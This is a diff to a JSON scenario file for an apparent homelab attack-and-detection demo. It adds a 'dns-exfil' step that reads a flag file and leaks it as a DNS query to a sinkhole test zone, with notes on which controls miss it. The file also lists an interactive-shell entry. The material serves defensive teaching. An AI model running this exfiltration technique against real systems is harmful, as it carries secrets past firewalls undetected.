@@ -231,6 +231,25 @@
       "explain": "A network tool started: Falco flagged it and Talon quarantined the pod. The run goes on - you still have a shell - but Cilium has cut every connection, both ways, so the shop next to you just went unreachable. You are trapped with nothing to call out to."
     },
     {
+      "id": "dns-exfil",
+      "input": "nslookup sdp-<flag>.x.exfil.sdp.test.",
+      "aliases": [
+        "exfil"
+      ],
+      "objective": "exfiltration",
+      "technique": "T1048.003",
+      "command": [
+        "sh",
+        "-c",
+        "read -r f </srv/shop/.flag; h=${f#SDP\\{}; h=${h%\\}}; case $h in ''|*[!0-9a-f]*) echo 'no flag found'; exit 1;; esac; [ ${#h} -eq 16 ] || exit 1; c=$(nslookup -type=a ok.x.exfil.sdp.test. 2>&1); case $c in *'Address: 192.0.2.53'*) ;; *) echo 'sinkhole not answering, nothing sent'; exit 1;; esac; n=sdp-$h.x.exfil.sdp.test.; echo \"query $n\"; o=$(nslookup -type=a \"$n\" 2>&1); echo \"$o\"; case $o in *NXDOMAIN*) exit 0;; esac; exit 1"
+      ],
+      "tty": false,
+      "outcome": "allowed",
+      "layer": "network",
+      "control": "Falco has no rule for name lookups; only the SIEM correlates it",
+      "explain": "The command read the flag file, turned SDP{...} into the label sdp-<16 hex> and asked the cluster's DNS server for that name - the oldest way to carry data past a firewall that lets DNS out. It first checked that the server answers that zone itself (a test name resolves to 192.0.2.53); it does, with NXDOMAIN, and never passes the name on, so nothing left the homelab; but the question carried the secret. Falco saw nothing: none of its rules watches name lookups. Hubble recorded the query, and tying it to this run is the SIEM's job. Quarantined first (wget), the query never leaves the pod and the command fails."
+    },
+    {
       "id": "shell",
       "input": "sh -i",
       "aliases": [
